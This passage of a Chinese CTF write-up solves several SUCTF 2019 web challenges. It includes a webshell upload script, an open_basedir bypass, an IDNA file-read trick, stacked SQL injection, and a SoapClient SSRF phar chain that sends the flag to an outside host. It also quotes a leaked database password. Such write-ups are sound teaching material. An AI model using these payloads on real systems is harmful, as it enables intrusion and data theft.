+<p>所以简单的做法就是把上面的可用字符串再给fuzz一遍，最终得到如下payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();</span><br></pre></td></tr></table></figure></p>
+<p>所以我们就可以写脚本来一键getshell了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://47.111.59.243:9001/?_=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;&#123;%fe&#125;();&amp;%fe=get_the_flag"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">htaccess = <span class="string">b"""\x00\x00\x8a\x39\x8a\x39</span></span><br><span class="line"><span class="string">AddType application/x-httpd-php .zzzz</span></span><br><span class="line"><span class="string">php_value auto_append_file "php://filter/convert.base64-decode/resource=/var/www/html/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz"</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">shell = <span class="string">b"\x00\x00\x8a\x39\x8a\x39"</span>+<span class="string">b"00"</span>+ base64.b64encode(<span class="string">b"&lt;?php eval($_GET['c']);?&gt;"</span>)</span><br><span class="line"><span class="comment"># shell =  b"\x00\x00\x8a\x39\x8a\x39"+b"00" + "&lt;script language='php'&gt;eval($_REQUEST[c]);&lt;/script&gt;"</span></span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'.htaccess'</span>,htaccess,<span class="string">'image/jpeg'</span>))]</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">"upload"</span>:<span class="string">"Submit"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxies = &#123;"http":"http://127.0.0.1:8080"&#125;</span></span><br><span class="line">print(<span class="string">"upload .htaccess"</span>)</span><br><span class="line">r = requests.post(url=url,files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(r.text) </span></span><br><span class="line"></span><br><span class="line">print(<span class="string">"upload shell.zzzz"</span>)</span><br><span class="line"></span><br><span class="line">files = [(<span class="string">'file'</span>,(<span class="string">'shell.zzzz'</span>,shell,<span class="string">'application/octet-stream'</span>))]</span><br><span class="line">r = requests.post(url=url,files=files)</span><br><span class="line"></span><br><span class="line"><span class="comment"># r = requests.get('http://47.111.59.243:9001/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=system(%27ls%27);')</span></span><br><span class="line"><span class="comment"># r = requests.get("http://47.111.59.243:9001/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(scandir('/'));")</span></span><br><span class="line">r = requests.get(<span class="string">"http://47.111.59.243:9001/upload/tmp_13c21ab4858db269eab22891ac26c5be/shell.zzzz?c=chdir('img');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');print_r(file_get_contents('/THis_Is_tHe_F14g'));"</span>)</span><br><span class="line"><span class="keyword">print</span> r.text</span><br></pre></td></tr></table></figure></p>
+<p>最终得到flag<br><img src="https://i.loli.net/2019/09/05/6hXeyQgimSRdZsj.png" alt="EA4BD431-2FDC-48FC-8B9F-52C77D727628.png"></p>
+<h2 id="0x03-Pythonginx"><a href="#0x03-Pythonginx" class="headerlink" title="0x03 Pythonginx"></a>0x03 Pythonginx</h2><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://47.111.59.243:9000/" target="_blank" rel="noopener">http://47.111.59.243:9000/</a></p>
+<h4 id="题目解答-2"><a href="#题目解答-2" class="headerlink" title="题目解答"></a>题目解答</h4><p>右键直接看到题目的源代码（完好格式）<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure></p>
+<p>看到这个代码立马想到最近blackhat大会上公布的几个trick，具体链接如下</p>
+<p><a href="https://bugs.python.org/issue36742" target="_blank" rel="noopener">https://bugs.python.org/issue36742</a></p>
+<p><a href="https://bugs.python.org/issue36216" target="_blank" rel="noopener">https://bugs.python.org/issue36216</a></p>
+<p><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
+<p>网页源码的注释上也有提示<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- Do you know the nginx? --&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>所以我们结合上面的信息，来构造payload如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file://suctf.c%E2%84%82/../../../etc/passwd</span><br></pre></td></tr></table></figure></p>
+<p>此处用于构造c的字符来源</p>
+<p><a href="https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols" target="_blank" rel="noopener">https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols</a></p>
+<p>经过一番fuzz，在配置文件中读到flag的路径和名称<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file://suctf.c%E2%84%82/../../../usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 80;</span><br><span class="line">    location / &#123;</span><br><span class="line">        try_files $uri @app;</span><br><span class="line">    &#125;</span><br><span class="line">    location @app &#123;</span><br><span class="line">        include uwsgi_params;</span><br><span class="line">        uwsgi_pass unix:///tmp/uwsgi.sock;</span><br><span class="line">    &#125;</span><br><span class="line">    location /static &#123;</span><br><span class="line">        alias /app/static;</span><br><span class="line">    &#125;</span><br><span class="line">    # location /flag &#123;</span><br><span class="line">    #     alias /usr/fffffflag;</span><br><span class="line">    # &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>最终读到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url=file://suctf.c%E2%84%82/../../../usr/fffffflag</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://i.loli.net/2019/09/05/M3W1296Pk87cBxh.png" alt="12C801C2-3D42-43C5-8A68-7F8A2613DDD8.png"></p>
+<p>如果你的字典不够给力，fuzz不到的话，不妨试试这个</p>
+<p><a href="https://github.com/zer0yu/Berserker/blob/master/webfuzz/fi/lfi.txt" target="_blank" rel="noopener">https://github.com/zer0yu/Berserker/blob/master/webfuzz/fi/lfi.txt</a></p>
+<h2 id="0x04-easy-sql"><a href="#0x04-easy-sql" class="headerlink" title="0x04 easy_sql"></a>0x04 easy_sql</h2><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://47.111.59.243:9061" target="_blank" rel="noopener">http://47.111.59.243:9061</a></p>
+<h4 id="题目解答-3"><a href="#题目解答-3" class="headerlink" title="题目解答"></a>题目解答</h4><p>显示随便测了一下，发现一般会有以下四种返回结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1. query=1e100</span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">2.	query=0x730065006c0065006300740020004000400076006500%20%2e%2e%2e</span><br><span class="line"></span><br><span class="line">Too long.</span><br><span class="line"></span><br><span class="line">3.	query=1)%20or%20benchmark(10000000,MD5(1))#</span><br><span class="line"></span><br><span class="line">Nonono.</span><br><span class="line"></span><br><span class="line">4.	query=NULL</span><br><span class="line"></span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; </span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
+<p>可以看到字符长度是有限制的，而且过滤了一些关键词</p>
+<p>之后fuzz测试的过程中发现是堆叠注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"># 显示数据库</span><br><span class="line">query=1; show databases;</span><br><span class="line"># 回显</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; information_schema</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; CTF</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; mysql</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; performance_schema</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; score_mbamission</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; score_minnesotaunited</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 回显表名</span><br><span class="line">query=1; show tables;</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; 1</span><br><span class="line">)</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; Flag</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 但是过滤了from</span><br><span class="line">query=1; select * from Flag;</span><br><span class="line"># 回显</span><br><span class="line">Nonono.</span><br><span class="line"># 这样也不行</span><br><span class="line">query=1; SET @SQL=0x73656c656374202a2066726f6d20466c61673b;PREPARE pord</span><br></pre></td></tr></table></figure>
+<p>所以最后解决方法是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 直接输出flag</span><br><span class="line">query=*,1</span><br><span class="line"># 回显</span><br><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    [0] =&gt; SUCTF&#123;SUCTF_baby_sql_chall_120993n810h3&#125;</span><br><span class="line">    [1] =&gt; 1</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p>
+<p>别问，问就是fuzz</p>
+<p><a href="https://github.com/zer0yu/Berserker/blob/master/webfuzz/sqli/sql_fuzz.txt" target="_blank" rel="noopener">https://github.com/zer0yu/Berserker/blob/master/webfuzz/sqli/sql_fuzz.txt</a></p>
+<h2 id="0x05-Upload-labs-2"><a href="#0x05-Upload-labs-2" class="headerlink" title="0x05 Upload labs 2"></a>0x05 Upload labs 2</h2><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><p>去看看你自己到底传了个啥 <a href="http://47.111.59.243:9025/" target="_blank" rel="noopener">http://47.111.59.243:9025/</a> 交flag时去掉引号</p>
+<h4 id="题目解答-4"><a href="#题目解答-4" class="headerlink" title="题目解答"></a>题目解答</h4><p>题目有附件，所以是一个代码审计题目，先看最终怎么可以getflag，发现有对应的函数，在<code>admin.php</code>中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">    getFlag(<span class="keyword">$this</span>-&gt;ip, <span class="keyword">$this</span>-&gt;port);</span><br><span class="line">    <span class="comment">//使用你自己的服务器监听一个确保可以收到消息的端口来获取flag</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>而且还限制了必须是本地来访问这个<code>admin.php</code>文件</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">'127.0.0.1'</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'admin'</span>]))&#123;</span><br></pre></td></tr></table></figure>
+<p>所以目标很明确，就是要ssrf的点来触发这个，从而把flag发给我</p>
+<p>但是很尴尬的是在<code>func.php</code>中的正则，过滤掉了<code>phar</code>这个关键字，所以初看，感觉点没有办法触发，但是后面经过分析正则的话，发现使用如下方式可以bypass掉这个正则过滤，进而触发phar反序列化。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://poc.phar</span><br></pre></td></tr></table></figure>
+<p>之所以想到这个phar文件，是因为这是一个上传题，而且存在一个疑似phar反序列化的触发点–<code>func.php</code>中的这几行代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$file_path = $_POST[<span class="string">'url'</span>];</span><br><span class="line">$file = <span class="keyword">new</span> File($file_path);</span><br><span class="line">$file-&gt;getMIME();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;p&gt;Your file type is '$file' &lt;/p&gt;"</span>;</span><br></pre></td></tr></table></figure>
+<p>具体来说就是<code>getMIME()</code>函数中的<code>finfo_open</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getMIME</span><span class="params">()</span></span>&#123;</span><br><span class="line">    $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;type = finfo_file($finfo, <span class="keyword">$this</span>-&gt;file_name);</span><br><span class="line">    finfo_close($finfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>但是网站并没有公开说明这个函数可以触发phar反序列化，我是怎么知道的呢？</p>
+<p>zsx师傅曾在他的文章<a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">《Phar与Stream Wrapper造成PHP RCE的深入挖掘》</a>写到，只要函数在底层调用了这个<code>php_stream_locate_url_wrapper</code>函数，那么就能触发phar反序列化，而<code>finfo_open</code>函数在底层恰好就是使用了这个函数。（其实这个点本地盲打也能触发，所以发现的话也不难）</p>
+<p>ext/fileinfo/fileinfo.c:517<br><img src="https://i.loli.net/2019/09/05/NWG7hzBS68DRYrK.png" alt="7F3C92B8-95A2-47A7-8C89-EAEE4EB9B696.png"></p>
+<p>到此为止反序列化已经完整了，那么怎么进行ssrf呢？很容易联想到之前<code>wupco</code>出的easyphp中的<code>SoapClient</code>，所以就可以构造如下payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> $file_name;</span><br><span class="line">    <span class="keyword">public</span> $type;</span><br><span class="line">    <span class="keyword">public</span> $func = <span class="string">"SoapClient"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;file_name = array(null, array('location' =&gt; "http://127.0.0.1/admin.php", 'uri' =&gt; "123", 'user_agent' =&gt; "heihei\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 133\r\n\r\nip=47.90.204.28&amp;port=2333&amp;admin=123&amp;clazz=ArrayIterator&amp;func1=append&amp;func2=append&amp;func3=append&amp;arg1=1&amp;arg2=1&amp;arg3=1\r\n\r\n\r\n"));</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;file_name = <span class="keyword">array</span>(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; <span class="string">"http://127.0.0.1/admin.php"</span>, <span class="string">'uri'</span> =&gt; <span class="string">"123"</span>, <span class="string">'user_agent'</span> =&gt; <span class="string">"heihei\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 133\r\n\r\nip=47.90.204.28&amp;port=2333&amp;admin=123&amp;clazz=SplStack&amp;func1=push&amp;func2=push&amp;func3=push&amp;arg1=1&amp;arg2=1&amp;arg3=1\r\n\r\n\r\n"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$o = <span class="keyword">new</span> File();</span><br><span class="line">$filename = <span class="string">'poc.phar'</span>;</span><br><span class="line">file_exists($filename) ? unlink($filename) : <span class="keyword">null</span>;</span><br><span class="line">$phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89a&lt; ?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">$phar-&gt;setMetadata($o);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">"foo.txt"</span>,<span class="string">"bar"</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>修改后缀为<code>gif</code>之后上传得到上传路径来触发</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://upload/8256248f8bb97051ddea1f7946057e08/2d32ae0bbeb53285459d07235d464102.gif</span><br></pre></td></tr></table></figure>
+<p>直接得到flag<br><img src="https://i.loli.net/2019/09/05/qJ12CDBzcX4fiK8.png" alt="AEA5041C-692A-4DB0-98F3-FE334A07A196.png"></p>
+<h2 id="0x06-Cocktail’s-Remix"><a href="#0x06-Cocktail’s-Remix" class="headerlink" title="0x06 Cocktail’s Remix"></a>0x06 Cocktail’s Remix</h2><h4 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h4><p><a href="http://47.111.59.243:9016/" target="_blank" rel="noopener">http://47.111.59.243:9016/</a></p>
+<h4 id="题目解答-5"><a href="#题目解答-5" class="headerlink" title="题目解答"></a>题目解答</h4><p>访问 <a href="http://47.111.59.243:9016/" target="_blank" rel="noopener">http://47.111.59.243:9016/</a></p>
+<p>发现回显的是 It Works!</p>
+<p>所以尝试爆破路径</p>
+<p>结果发现 <a href="http://47.111.59.243:9016/robots.txt" target="_blank" rel="noopener">http://47.111.59.243:9016/robots.txt</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /info.php</span><br><span class="line">Disallow: /download.php</span><br><span class="line">Disallow: /config.php</span><br></pre></td></tr></table></figure>
+<p>存在任意文件下载漏洞 <a href="http://47.111.59.243:9016/download.php" target="_blank" rel="noopener">http://47.111.59.243:9016/download.php</a></p>
+<p>参数是fuzz出来的<code>filename</code>（字典链接同上）</p>
+<p><img src="https://i.loli.net/2019/09/05/i7X39aKvsDqZryg.png" alt="BA49C246-7822-4530-BEB6-8F3E7107851E.png"></p>
+<p>继续使用上述字典进行fuzz，筛选出有价值的信息如下</p>
+<p>从<code>/etc/hosts</code>发现是存在内网的mysql服务器的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># /etc/hosts</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">172.77.120.11   MysqlServer</span><br><span class="line">172.77.120.10   f8a7f2ca8591</span><br></pre></td></tr></table></figure></p>
+<p>继续读源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># download.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	$filename = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">	header(<span class="string">"Content-Disposition: attachment;filename="</span>.$filename);</span><br><span class="line">	header(<span class="string">'Content-Length: '</span>.filesize($filename));</span><br><span class="line">	readfile($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>看到读出了MySQL的账号密码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">//$db_server = "MysqlServer";</span></span><br><span class="line">	<span class="comment">//$db_username = "dba";</span></span><br><span class="line">    <span class="comment">//$db_password = "rNhHmmNkN3xu4MBYhm";	</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>还有一个phpinfo页面<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># info.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>在页面上没有发现常规漏洞，但是发现了一个与题目名称类似的扩展模块</p>
+<p><img src="https://i.loli.net/2019/09/05/ApqTzZoxN7RFiPG.png" alt="26702F33-A0B9-46C5-B715-2809924CD850.png"></p>
+<p>所以尝试进行下载 <code>/usr/lib/apache2/modules/mod_cocktail.so</code></p>
+<p>先用file命令看了一下，发现是64位程序，所以使用IDA Pro直接来进行分析</p>
+<p><img src="https://i.loli.net/2019/09/05/JMl7xh3vN9VO8dg.png" alt="52722269-5528-4210-AAD5-B278614FD402.png"></p>
+<p>直接定位到关键函数，可以看到其中使用了<code>popen</code>函数来执行经过<code>j_remix</code>函数处理的<code>reffer</code>变量，所以基本可以判定此处是存在一个命令执行的后门。<br><img src="https://i.loli.net/2019/09/05/5aALED7ZmKgzOFW.png" alt="C4D0A50A-E002-4320-8503-2C3570E9A3DB.png"></p>
+<p><code>j_remix</code>函数是调用了<code>remix</code>函数，看起来比较复杂，但应该是某种编码方式</p>
+<p><img src="https://i.loli.net/2019/09/05/pNoUHemk8gz65IC.png" alt="2401F6EC-FAAD-4AD3-A254-B1A7B5411AC5.png"></p>
+<p>此处使用IDA的findcrypt插件，直接发现了base64表，所以猜测是base64编码</p>
+<p><img src="https://i.loli.net/2019/09/05/c4YKaMtJT2G51Hx.png" alt="BE1138CB-7F30-4541-B3AB-8E9B5B828077.png"></p>
+<p>那么接下来可以测一下这个后门，可以看到成功回显</p>
+<p><img src="https://i.loli.net/2019/09/05/uanreZOVpRiPd1f.png" alt="F22B1242-EFDD-483F-AB02-18C262DF8CEF.png"></p>
+<p>可以看到没有权限写webshell</p>
